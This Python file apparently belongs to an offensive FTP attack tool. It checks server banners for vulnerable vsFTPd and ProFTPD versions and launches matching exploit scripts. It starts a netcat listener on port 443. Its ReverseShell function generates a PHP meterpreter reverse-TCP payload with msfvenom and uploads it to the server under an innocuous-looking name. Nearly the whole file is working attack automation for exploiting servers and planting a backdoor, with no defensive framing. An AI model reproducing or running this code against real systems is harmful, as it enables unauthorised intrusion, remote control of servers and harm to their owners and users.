
import os
import subprocess
from colorama import Fore # for fancy colors, nothing else

vuln_list = ['vsFTPd 2.3.4','ProFTPD 1.3.3c','ProFTPD 1.3.5','ProFTPD 1.3.2rc3']
payload = 'xtrfhrjuyt56.php'
vsFTP_backdoor = "Exploits/Linux/49757.py"
proFTP_135 = "Exploits/Linux/proftpd_1.3.5.py"
proFTP_133c = "Exploits/Linux/proftpd-1.3.3c.py"
ProFTPD_132rc3 = 'Exploits/Linux/ProFTPD_1.3.2rc3.py'
msfvenom_host = ''
msfvenom_port = 443

def vuln(ip,lib,t):
    for x in vuln_list:
        if x.strip('\n') in lib.getwelcome():
            print(Fore.YELLOW + "    [!] " + Fore.RESET + x.strip('\n') + ' ' + Fore.RED + "Vulnerable" + Fore.RESET)
            exploit = input(Fore.MAGENTA + "    [?]" + Fore.RESET + " Run Exploit Y/N ? ")
            if exploit.upper() == "Y":
                if "vsFTPd 2.3.4" in lib.getwelcome():
                    vsFTP_exploit(ip)
                elif "ProFTPD 1.3.5" in lib.getwelcome():
                    proFTP_V135(ip)
                elif "ProFTPD 1.3.3c" in lib.getwelcome():
                    local = input('   [?] Enter Private IP? ')
                    proFTP_V133c(local,ip)
                elif "ProFTPD 1.3.2rc3" in lib.getwelcome():
                    proFTP_132rc3(ip)
                
def vuln_backdoor(ip,lib,t):
    for x in vuln_list:
        if x.strip('\n') in lib.getwelcome():
            print(Fore.YELLOW + "    [!] " + Fore.RESET + x.strip('\n') + ' ' + Fore.RED + "Vulnerable" + Fore.RESET)
            exploit = input(Fore.MAGENTA + "    [?]" + Fore.RESET + " Run Exploit Y/N? ")
            if exploit.upper() == "Y":
                if "vsFTPd 2.3.4" in lib.getwelcome():
                    vsFTP_exploit(ip)
                elif "ProFTPD 1.3.5" in lib.getwelcome():
                    proFTP_V135(ip)
                elif "ProFTPD 1.3.3c" in lib.getwelcome():
                    local = input('    [?] Enter Private IP? ')
                    proFTP_V133c(local,ip)
                elif "ProFTPD 1.3.2rc3" in lib.getwelcome():
                    proFTP_132rc3(ip)
                

def vsFTP_exploit(ip):
    print("    [*] Exploting vsFTP Backdoor...")
    os.system('python3 ' + vsFTP_backdoor + ' ' + ip)
        
def proFTP_V135(ip):
    print("    [*] Exploiting ProFTP 1.3.5 Uploading Backdoor...")
    os.system('python3 ' + proFTP_135 + " " + ip.strip('\n'))
    print('[*] Starting Netcat')
    os.system('sudo nc -lvp 443')    
def proFTP_V133c(lhost,rhost):
    print("    [*] Exploiting ProFTP 1.3.3c Backdoor...")
    os.system('python3 ' + proFTP_133c + ' ' + lhost + ' ' + rhost )
        
def proFTP_132rc3(ip):
    print("    [*] Exploiting ProFTP 1.3.2rc3 Through Telnet...")
    os.system('python3 ' + ProFTPD_132rc3 + ' ' + ip)
        
def ReverseShell(lib):
    print(f"{Fore.CYAN}    [*] Generating New MSFVenom Payload..." + Fore.RESET)
    subprocess.getoutput("msfvenom -p php/meterpreter_reverse_tcp lhost=" + msfvenom_host + " lport=" + str(msfvenom_port) + " -f raw -o " + payload)
    print(Fore.GREEN + "[+] " + Fore.RESET + payload + "has been created")
    print(f"{Fore.CYAN}[*] Uploading Backdoor...",Fore.RESET)
    with open(payload, 'rb') as file:
        lib.storbinary(f"STOR {payload}",file)
        print(Fore.GREEN + '[*]' + Fore.RESET +  ' Backdoor Successfully Uploaded Listing Files:')
        lib.retrlines("LIST")
        print(f"{Fore.GREEN}[*] FTP Server OWNED",Fore.RESET)
